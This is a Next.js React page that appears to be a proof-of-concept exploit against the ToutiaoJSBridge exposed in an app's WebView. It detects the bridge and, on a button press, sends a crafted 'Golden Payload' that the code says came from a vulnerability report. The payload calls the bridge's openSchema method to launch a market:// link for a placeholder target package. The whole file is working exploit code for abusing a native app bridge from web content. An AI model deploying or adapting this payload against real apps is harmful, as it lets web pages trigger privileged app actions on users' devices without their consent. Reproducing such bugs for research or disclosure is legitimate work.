"use client"
import { useState, useEffect } from 'react';
import Head from 'next/head';
import styles from '../styles/Home.module.css';

export default function FinalTestPage() {
    const [isBridgeReady, setIsBridgeReady] = useState(false);
    const [feedback, setFeedback] = useState('');

    // Replace this with your target app's package ID
    const TARGET_APP_PACKAGE_ID = 'com.your.target.app.package_id';

    // Check if the ToutiaoJSBridge exists as soon as the page loads
    useEffect(() => {
        if (typeof window !== 'undefined' && window.ToutiaoJSBridge && typeof window.ToutiaoJSBridge.invokeMethod === 'function') {
            setIsBridgeReady(true);
            setFeedback('Bridge detected. Ready to test.');
        } else {
            setIsBridgeReady(false);
            setFeedback('Error: window.ToutiaoJSBridge not found. This test will not work.');
        }
    }, []);

    const executePayload = () => {
        if (!isBridgeReady) {
            alert('Cannot execute: ToutiaoJSBridge not found.');
            return;
        }

        // This is the "Golden Payload" derived from the vulnerability report.
        const payload = {
            "__callback_id": "0",
            "func": "openSchema",
            "__msg_type": "callback",
            "params": {
                "schema": `market://details?id=${TARGET_APP_PACKAGE_ID}`
            },
            "JSSDK": "1",
            "namespace": "host",
            // Using a neutral, valid URL for the iframe parameter
            "__iframe_url": "https://www.google.com/"
        };

        try {
            // Update the UI right before firing the command
            setFeedback('Executing payload... If successful, the Play Store will open.');

            // THE FINAL COMMAND
            window.ToutiaoJSBridge.invokeMethod(JSON.stringify(payload));

        } catch (e) {
            console.error("Error invoking bridge:", e);
            setFeedback(`An error occurred while calling invokeMethod: ${e.message}`);
            alert(`An error occurred: ${e.message}`);
        }
    };

    return (
        <div className={styles.container}>
            <Head>
                <title>Final Bridge Test</title>
            </Head>

            <main className={styles.main}>
                <h1 className={styles.title}>
                    ToutiaoJSBridge <code>openSchema</code> Test
                </h1>

                <p className={styles.description}>
                    This page will execute the precise payload discovered from public vulnerability research.
                </p>

                <div style={{ margin: '2rem 0' }}>
                    <button
                        onClick={executePayload}
                        disabled={!isBridgeReady}
                        style={{
                            padding: '25px 50px',
                            fontSize: '24px',
                            cursor: isBridgeReady ? 'pointer' : 'not-allowed',
                            backgroundColor: isBridgeReady ? '#0070f3' : '#ccc',
                            color: 'white',
                            border: 'none',
                            borderRadius: '10px'
                        }}
                    >
                        Open in Play Store
                    </button>
                </div>

                <div style={{ marginTop: '1rem', padding: '10px', border: '1px solid #ddd', borderRadius: '5px', minHeight: '50px', background: '#f8f9fa' }}>
                    <strong>Status:</strong> {feedback}
                </div>
            </main>
        </div>
    );
}